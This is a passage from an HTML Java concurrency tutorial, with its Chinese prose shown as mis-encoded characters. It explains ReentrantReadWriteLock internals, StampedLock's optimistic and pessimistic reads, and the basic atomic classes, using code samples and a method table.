<span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">exclusiveCount</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span> { <span class="hljs-keyword">return</span> c &amp; EXCLUSIVE_MASK; }
</code></pre>
<p><strong>stateç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">state</span> (<span class="hljs-number">32</span>ä½)
â”œâ”€â”€ é«˜<span class="hljs-number">16</span>ä½ï¼šè¯»é”è®¡æ•°ï¼ˆæœ€å¤š<span class="hljs-number">65535</span>ä¸ªè¯»é”ï¼‰
â””â”€â”€ ä½<span class="hljs-number">16</span>ä½ï¼šå†™é”è®¡æ•°ï¼ˆé‡å…¥æ¬¡æ•°ï¼‰
</code></pre>
<h4 data-id="heading-181">ä½16ä½å­˜å‚¨å†™é”çŠ¶æ€</h4>
<p><strong>å†™é”çš„è·å–ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    <span class="hljs-type">int</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> exclusiveCount(c); <span class="hljs-comment">// è·å–å†™é”è®¡æ•°</span>
    
    <span class="hljs-keyword">if</span> (c != <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// æœ‰è¯»é”æˆ–å…¶ä»–çº¿ç¨‹æŒæœ‰å†™é”</span>
        <span class="hljs-keyword">if</span> (w == <span class="hljs-number">0</span> || current != getExclusiveOwnerThread())
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        
        <span class="hljs-comment">// å¯é‡å…¥</span>
        <span class="hljs-keyword">if</span> (w + exclusiveCount(acquires) &gt; MAX_COUNT)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
        setState(c + acquires);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-comment">// å°è¯•è·å–å†™é”</span>
    <span class="hljs-keyword">if</span> (writerShouldBlock() || !compareAndSetState(c, c + acquires))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    setExclusiveOwnerThread(current);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<h4 data-id="heading-182">è¯»é”çš„è·å–å’Œé‡Šæ”¾</h4>
<p><strong>è¯»é”çš„è·å–ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> unused)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    
    <span class="hljs-comment">// å¦‚æœæœ‰å†™é”ä¸”ä¸æ˜¯å½“å‰çº¿ç¨‹æŒæœ‰ï¼Œå¤±è´¥</span>
    <span class="hljs-keyword">if</span> (exclusiveCount(c) != <span class="hljs-number">0</span> &amp;&amp; getExclusiveOwnerThread() != current)
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    
    <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> sharedCount(c); <span class="hljs-comment">// è¯»é”è®¡æ•°</span>
    <span class="hljs-keyword">if</span> (!readerShouldBlock() &amp;&amp; r &lt; MAX_COUNT &amp;&amp;
        compareAndSetState(c, c + SHARED_UNIT)) {
        <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–è¯»é”</span>
        <span class="hljs-keyword">if</span> (r == <span class="hljs-number">0</span>) {
            firstReader = current;
            firstReaderHoldCount = <span class="hljs-number">1</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (firstReader == current) {
            firstReaderHoldCount++;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// ä½¿ç”¨ThreadLocalå­˜å‚¨æ¯ä¸ªçº¿ç¨‹çš„è¯»é”è®¡æ•°</span>
            <span class="hljs-type">HoldCounter</span> <span class="hljs-variable">rh</span> <span class="hljs-operator">=</span> cachedHoldCounter;
            <span class="hljs-keyword">if</span> (rh == <span class="hljs-literal">null</span> || rh.tid != getThreadId(current))
                cachedHoldCounter = rh = readHolds.get();
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rh.count == <span class="hljs-number">0</span>)
                readHolds.set(rh);
            rh.count++;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }
    <span class="hljs-keyword">return</span> fullTryAcquireShared(current);
}
</code></pre>
<p><strong>è¯»é”çš„é‡Šæ”¾ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> unused)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    
    <span class="hljs-keyword">if</span> (firstReader == current) {
        <span class="hljs-keyword">if</span> (firstReaderHoldCount == <span class="hljs-number">1</span>)
            firstReader = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">else</span>
            firstReaderHoldCount--;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-type">HoldCounter</span> <span class="hljs-variable">rh</span> <span class="hljs-operator">=</span> cachedHoldCounter;
        <span class="hljs-keyword">if</span> (rh == <span class="hljs-literal">null</span> || rh.tid != getThreadId(current))
            rh = readHolds.get();
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> rh.count;
        <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">1</span>) {
            readHolds.remove();
            <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)
                <span class="hljs-keyword">throw</span> unmatchedUnlockException();
        }
        --rh.count;
    }
    
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
        <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c - SHARED_UNIT;
        <span class="hljs-keyword">if</span> (compareAndSetState(c, nextc))
            <span class="hljs-keyword">return</span> nextc == <span class="hljs-number">0</span>;
    }
}
</code></pre>
<h4 data-id="heading-183">å†™é”çš„è·å–å’Œé‡Šæ”¾</h4>
<p><strong>å†™é”çš„è·å–ï¼š</strong> è§ä¸Šé¢çš„tryAcquireæ–¹æ³•</p>
<p><strong>å†™é”çš„é‡Šæ”¾ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-keyword">if</span> (!isHeldExclusively())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> getState() - releases;
    <span class="hljs-type">boolean</span> <span class="hljs-variable">free</span> <span class="hljs-operator">=</span> exclusiveCount(nextc) == <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> (free)
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
    setState(nextc);
    <span class="hljs-keyword">return</span> free;
}
</code></pre>
<h3 data-id="heading-184">8.4 StampedLock</h3>
<h4 data-id="heading-185">StampedLockçš„ç‰¹ç‚¹</h4>
<p><strong>StampedLock</strong>æ˜¯JDK 8å¼•å…¥çš„æ–°é”ï¼Œæä¾›äº†ä¸‰ç§æ¨¡å¼ï¼š</p>
<ol>
<li><strong>å†™é”ï¼ˆWritingï¼‰</strong>ï¼šç‹¬å é”ï¼Œç±»ä¼¼ReentrantReadWriteLockçš„å†™é”</li>
<li><strong>æ‚²è§‚è¯»é”ï¼ˆReadingï¼‰</strong>ï¼šå…±äº«é”ï¼Œç±»ä¼¼ReentrantReadWriteLockçš„è¯»é”</li>
<li><strong>ä¹è§‚è¯»é”ï¼ˆOptimistic Readingï¼‰</strong>ï¼šä¸é˜»å¡ï¼Œé€šè¿‡éªŒè¯æˆ³è®°æ¥æ£€æŸ¥æ•°æ®æ˜¯å¦è¢«ä¿®æ”¹</li>
</ol>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸æ”¯æŒé‡å…¥</li>
<li>ä¸æ”¯æŒCondition</li>
<li>æ€§èƒ½ä¼˜äºReentrantReadWriteLockï¼ˆç‰¹åˆ«æ˜¯åœ¨è¯»å¤šå†™å°‘çš„åœºæ™¯ï¼‰</li>
</ul>
<h4 data-id="heading-186">ä¹è§‚è¯»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.locks.StampedLock;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StampedLockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StampedLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> x, y;
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">distanceFromOrigin</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. å°è¯•ä¹è§‚è¯»</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> lock.tryOptimisticRead();
        <span class="hljs-type">double</span> <span class="hljs-variable">curX</span> <span class="hljs-operator">=</span> x, curY = y;
        
        <span class="hljs-comment">// 2. éªŒè¯æˆ³è®°æ˜¯å¦æœ‰æ•ˆï¼ˆæ£€æŸ¥æ˜¯å¦æœ‰å†™æ“ä½œï¼‰</span>
        <span class="hljs-keyword">if</span> (!lock.validate(stamp)) {
            <span class="hljs-comment">// 3. æˆ³è®°æ— æ•ˆï¼Œå‡çº§ä¸ºæ‚²è§‚è¯»é”</span>
            stamp = lock.readLock();
            <span class="hljs-keyword">try</span> {
                curX = x;
                curY = y;
            } <span class="hljs-keyword">finally</span> {
                lock.unlockRead(stamp);
            }
        }
        
        <span class="hljs-keyword">return</span> Math.sqrt(curX * curX + curY * curY);
    }
}
</code></pre>
<p><strong>ä¹è§‚è¯»çš„æµç¨‹ï¼š</strong></p>
<ol>
<li><code>tryOptimisticRead()</code>ï¼šè·å–ä¹è§‚è¯»æˆ³è®°ï¼Œä¸é˜»å¡</li>
<li>è¯»å–æ•°æ®</li>
<li><code>validate(stamp)</code>ï¼šéªŒè¯æˆ³è®°æ˜¯å¦æœ‰æ•ˆ
<ul>
<li>æœ‰æ•ˆï¼šè¯´æ˜æ²¡æœ‰å†™æ“ä½œï¼Œè¯»å–æˆåŠŸ</li>
<li>æ— æ•ˆï¼šè¯´æ˜æœ‰å†™æ“ä½œï¼Œå‡çº§ä¸ºæ‚²è§‚è¯»é”</li>
</ul>
</li>
</ol>
<h4 data-id="heading-187">æ‚²è§‚è¯»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">read</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// è·å–æ‚²è§‚è¯»é”</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> lock.readLock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> x + y;
    } <span class="hljs-keyword">finally</span> {
        lock.unlockRead(stamp);
    }
}
</code></pre>
<p><strong>æ‚²è§‚è¯»é”ï¼š</strong></p>
<ul>
<li>ç±»ä¼¼ReentrantReadWriteLockçš„è¯»é”</li>
<li>å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰</li>
<li>ä¸å†™é”äº’æ–¥</li>
</ul>
<h4 data-id="heading-188">å†™é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">double</span> deltaX, <span class="hljs-type">double</span> deltaY)</span> {
    <span class="hljs-comment">// è·å–å†™é”</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> lock.writeLock();
    <span class="hljs-keyword">try</span> {
        x += deltaX;
        y += deltaY;
    } <span class="hljs-keyword">finally</span> {
        lock.unlockWrite(stamp);
    }
}
</code></pre>
<p><strong>å†™é”ï¼š</strong></p>
<ul>
<li>ç‹¬å é”ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰</li>
<li>ä¸è¯»é”å’Œå†™é”éƒ½äº’æ–¥</li>
</ul>
<h4 data-id="heading-189">æ€§èƒ½å¯¹æ¯”</h4>
<p><strong>æ€§èƒ½æµ‹è¯•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockPerformanceComparison</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">StampedLock</span> <span class="hljs-variable">stampedLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedLock</span>();
    
    <span class="hljs-comment">// ReentrantReadWriteLock</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readWithRWLock</span><span class="hljs-params">()</span> {
        rwLock.readLock().lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è¯»æ“ä½œ</span>
        } <span class="hljs-keyword">finally</span> {
            rwLock.readLock().unlock();
        }
    }
    
    <span class="hljs-comment">// StampedLockä¹è§‚è¯»</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readWithStampedLock</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> stampedLock.tryOptimisticRead();
        <span class="hljs-comment">// è¯»æ“ä½œ</span>
        <span class="hljs-keyword">if</span> (!stampedLock.validate(stamp)) {
            stamp = stampedLock.readLock();
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// è¯»æ“ä½œ</span>
            } <span class="hljs-keyword">finally</span> {
                stampedLock.unlockRead(stamp);
            }
        }
    }
}
</code></pre>
<p><strong>æ€§èƒ½ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è¯»å¤šå†™å°‘</strong>ï¼šStampedLockï¼ˆä¹è§‚è¯»ï¼‰æ€§èƒ½æœ€å¥½</li>
<li><strong>å†™å¤šè¯»å°‘</strong>ï¼šæ€§èƒ½æ¥è¿‘</li>
<li><strong>è¯»æ“ä½œå æ¯”é«˜</strong>ï¼šStampedLockä¼˜åŠ¿æ˜æ˜¾ï¼ˆå‡å°‘é”ç«äº‰ï¼‰</li>
</ul>
<p><strong>ä½¿ç”¨å»ºè®®ï¼š</strong></p>
<ul>
<li>è¯»å¤šå†™å°‘ï¼šä¼˜å…ˆä½¿ç”¨StampedLock</li>
<li>éœ€è¦é‡å…¥ï¼šä½¿ç”¨ReentrantReadWriteLock</li>
<li>éœ€è¦Conditionï¼šä½¿ç”¨ReentrantReadWriteLock</li>
</ul>
<hr/>
<h2 data-id="heading-190">ç¬¬ä¹ç«  åŸå­ç±»ï¼ˆAtomicï¼‰</h2>
<h3 data-id="heading-191">9.1 åŸå­ç±»æ¦‚è¿°</h3>
<h4 data-id="heading-192">åŸå­ç±»çš„åˆ†ç±»</h4>
<p>Javaä¸­çš„åŸå­ç±»åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š</p>
<p><strong>1. åŸºæœ¬ç±»å‹åŸå­ç±»</strong></p>
<ul>
<li><code>AtomicInteger</code> - åŸå­æ•´å‹</li>
<li><code>AtomicLong</code> - åŸå­é•¿æ•´å‹</li>
<li><code>AtomicBoolean</code> - åŸå­å¸ƒå°”å‹</li>
</ul>
<p><strong>2. æ•°ç»„ç±»å‹åŸå­ç±»</strong></p>
<ul>
<li><code>AtomicIntegerArray</code> - åŸå­æ•´å‹æ•°ç»„</li>
<li><code>AtomicLongArray</code> - åŸå­é•¿æ•´å‹æ•°ç»„</li>
<li><code>AtomicReferenceArray</code> - åŸå­å¼•ç”¨æ•°ç»„</li>
</ul>
<p><strong>3. å¼•ç”¨ç±»å‹åŸå­ç±»</strong></p>
<ul>
<li><code>AtomicReference</code> - åŸå­å¼•ç”¨</li>
<li><code>AtomicStampedReference</code> - å¸¦ç‰ˆæœ¬å·çš„åŸå­å¼•ç”¨ï¼ˆè§£å†³ABAé—®é¢˜ï¼‰</li>
<li><code>AtomicMarkableReference</code> - å¸¦æ ‡è®°ä½çš„åŸå­å¼•ç”¨</li>
</ul>
<p><strong>4. å­—æ®µæ›´æ–°å™¨</strong></p>
<ul>
<li><code>AtomicIntegerFieldUpdater</code> - æ•´å‹å­—æ®µæ›´æ–°å™¨</li>
<li><code>AtomicLongFieldUpdater</code> - é•¿æ•´å‹å­—æ®µæ›´æ–°å™¨</li>
<li><code>AtomicReferenceFieldUpdater</code> - å¼•ç”¨ç±»å‹å­—æ®µæ›´æ–°å™¨</li>
</ul>
<p><strong>5. ç´¯åŠ å™¨ç±»ï¼ˆJDK 8+ï¼‰</strong></p>
<ul>
<li><code>LongAdder</code> - é•¿æ•´å‹ç´¯åŠ å™¨</li>
<li><code>LongAccumulator</code> - é•¿æ•´å‹ç´¯åŠ å™¨</li>
<li><code>DoubleAdder</code> - åŒç²¾åº¦ç´¯åŠ å™¨</li>
<li><code>DoubleAccumulator</code> - åŒç²¾åº¦ç´¯åŠ å™¨</li>
</ul>
<h4 data-id="heading-193">åŸå­ç±»çš„ä¼˜åŠ¿</h4>
<p><strong>1. æ— é”ç¼–ç¨‹</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼ˆéœ€è¦é”ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;
}

<span class="hljs-comment">// åŸå­ç±»æ–¹å¼ï¼ˆæ— é”ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();
}
</code></pre>
<p><strong>2. é«˜æ€§èƒ½</strong></p>
<ul>
<li>ä½¿ç”¨CASæ“ä½œï¼Œé¿å…çº¿ç¨‹é˜»å¡</li>
<li>åœ¨ä½ç«äº‰åœºæ™¯ä¸‹æ€§èƒ½ä¼˜äºsynchronized</li>
<li>é€‚åˆé«˜å¹¶å‘åœºæ™¯</li>
</ul>
<p><strong>3. çº¿ç¨‹å®‰å…¨</strong></p>
<ul>
<li>æ‰€æœ‰æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„</li>
<li>ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œæ— éœ€é¢å¤–çš„åŒæ­¥æœºåˆ¶</li>
</ul>
<p><strong>4. ç®€å•æ˜“ç”¨</strong></p>
<ul>
<li>APIç®€æ´æ˜äº†</li>
<li>ä¸éœ€è¦æ‰‹åŠ¨ç®¡ç†é”</li>
</ul>
<h3 data-id="heading-194">9.2 åŸºæœ¬ç±»å‹åŸå­ç±»</h3>
<h4 data-id="heading-195">AtomicInteger</h4>
<p><strong>AtomicIntegerå¸¸ç”¨æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// åŸºæœ¬æ“ä½œ</span>
count.get();                           <span class="hljs-comment">// è·å–å€¼</span>
count.set(<span class="hljs-number">10</span>);                         <span class="hljs-comment">// è®¾ç½®å€¼</span>
count.getAndSet(<span class="hljs-number">20</span>);                   <span class="hljs-comment">// è·å–æ—§å€¼å¹¶è®¾ç½®æ–°å€¼</span>
count.compareAndSet(<span class="hljs-number">20</span>, <span class="hljs-number">30</span>);          <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>

<span class="hljs-comment">// è‡ªå¢è‡ªå‡</span>
count.incrementAndGet();               <span class="hljs-comment">// ++countï¼Œè¿”å›æ–°å€¼</span>
count.getAndIncrement();               <span class="hljs-comment">// count++ï¼Œè¿”å›æ—§å€¼</span>
count.decrementAndGet();               <span class="hljs-comment">// --countï¼Œè¿”å›æ–°å€¼</span>
count.getAndDecrement();               <span class="hljs-comment">// count--ï¼Œè¿”å›æ—§å€¼</span>

<span class="hljs-comment">// åŠ å‡æ“ä½œ</span>
count.addAndGet(<span class="hljs-number">5</span>);                    <span class="hljs-comment">// åŠ 5ï¼Œè¿”å›æ–°å€¼</span>
count.getAndAdd(<span class="hljs-number">10</span>);                   <span class="hljs-comment">// è¿”å›æ—§å€¼ï¼Œå†åŠ 10</span>

<span class="hljs-comment">// å‡½æ•°å¼æ›´æ–°ï¼ˆJDK 8+ï¼‰</span>
count.updateAndGet(x -&gt; x * <span class="hljs-number">2</span>);        <span class="hljs-comment">// åŸå­æ›´æ–°</span>
count.getAndUpdate(x -&gt; x / <span class="hljs-number">2</span>);        <span class="hljs-comment">// è·å–å¹¶æ›´æ–°</span>
</code></pre>
<p><strong>ç®€å•åº”ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹å®‰å…¨çš„è®¡æ•°å™¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  <span class="hljs-comment">// åŸå­æ“ä½œï¼Œæ— éœ€é”</span>
}
</code></pre>
<h4 data-id="heading-196">AtomicLong</h4>
<p><strong>AtomicLongä¸AtomicIntegerç±»ä¼¼ï¼Œç”¨äºé•¿æ•´å‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicLong</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(<span class="hljs-number">0L</span>);
total.addAndGet(<span class="hljs-number">100</span>);                  <span class="hljs-comment">// å¢åŠ 100</span>
total.get();                           <span class="hljs-comment">// è·å–å€¼</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>åœ¨32ä½JVMä¸Šï¼Œlongçš„è¯»å†™ä¸æ˜¯åŸå­çš„</li>
<li>AtomicLongä¿è¯longç±»å‹çš„åŸå­æ“ä½œ</li>
<li>JDK 8+æ¨èä½¿ç”¨LongAdderï¼Œæ€§èƒ½æ›´å¥½</li>
</ul>
<h4 data-id="heading-197">AtomicBoolean</h4>
<p><strong>AtomicBooleanç”¨äºå¸ƒå°”ç±»å‹çš„åŸå­æ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);
flag.get();                            <span class="hljs-comment">// è·å–å€¼</span>
flag.set(<span class="hljs-literal">true</span>);                        <span class="hljs-comment">// è®¾ç½®å€¼</span>
flag.compareAndSet(<span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);      <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
flag.getAndSet(<span class="hljs-literal">false</span>);                <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
flag.lazySet(<span class="hljs-literal">true</span>);                   <span class="hljs-comment">// å»¶è¿Ÿè®¾ç½®</span>
</code></pre>
<p><strong>çŠ¶æ€æ ‡å¿—ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">true</span>);

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span> {
    running.set(<span class="hljs-literal">false</span>);
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (running.get()) {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    }
}
</code></pre>
<h4 data-id="heading-198">å¸¸ç”¨æ–¹æ³•æ€»ç»“</h4>
<p><strong>æ‰€æœ‰åŸºæœ¬ç±»å‹åŸå­ç±»éƒ½æä¾›ä»¥ä¸‹æ–¹æ³•ï¼š</strong></p>

































































<table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td><code>get()</code></td><td>è·å–å½“å‰å€¼</td><td>å½“å‰å€¼</td></tr><tr><td><code>set(int newValue)</code></td><td>è®¾ç½®æ–°å€¼</td><td>void</td></tr><tr><td><code>getAndSet(int newValue)</code></td><td>è·å–å½“å‰å€¼å¹¶è®¾ç½®æ–°å€¼</td><td>æ—§å€¼</td></tr><tr><td><code>compareAndSet(int expect, int update)</code></td><td>æ¯”è¾ƒå¹¶è®¾ç½®</td><td>boolean</td></tr><tr><td><code>lazySet(int newValue)</code></td><td>å»¶è¿Ÿè®¾ç½®ï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰</td><td>void</td></tr><tr><td><code>getAndIncrement()</code></td><td>å…ˆè¿”å›å†è‡ªå¢</td><td>æ—§å€¼</td></tr><tr><td><code>incrementAndGet()</code></td><td>å…ˆè‡ªå¢å†è¿”å›</td><td>æ–°å€¼</td></tr><tr><td><code>getAndDecrement()</code></td><td>å…ˆè¿”å›å†è‡ªå‡</td><td>æ—§å€¼</td></tr><tr><td><code>decrementAndGet()</code></td><td>å…ˆè‡ªå‡å†è¿”å›</td><td>æ–°å€¼</td></tr><tr><td><code>getAndAdd(int delta)</code></td><td>å…ˆè¿”å›å†åŠ </td><td>æ—§å€¼</td></tr><tr><td><code>addAndGet(int delta)</code></td><td>å…ˆåŠ å†è¿”å›</td><td>æ–°å€¼</td></tr></tbody></table>
<h3 data-id="heading-199">9.3 æ•°ç»„ç±»å‹åŸå­ç±»</h3>
<h4 data-id="heading-200">AtomicIntegerArray</h4>
<p><strong>AtomicIntegerArrayç”¨äºåŸå­åœ°æ›´æ–°æ•°ç»„ä¸­çš„å…ƒç´ ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicIntegerArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicIntegerArray</span>(<span class="hljs-number">10</span>);
array.get(<span class="hljs-number">0</span>);                          <span class="hljs-comment">// è·å–ç´¢å¼•0çš„å€¼</span>
array.set(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>);                      <span class="hljs-comment">// è®¾ç½®ç´¢å¼•0çš„å€¼</span>
array.getAndSet(<span class="hljs-number">0</span>, <span class="hljs-number">20</span>);               <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
array.compareAndSet(<span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>);      <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
array.incrementAndGet(<span class="hljs-number">0</span>);             <span class="hljs-comment">// ç´¢å¼•0è‡ªå¢</span>
array.addAndGet(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>);                <span class="hljs-comment">// ç´¢å¼•0åŠ 5</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
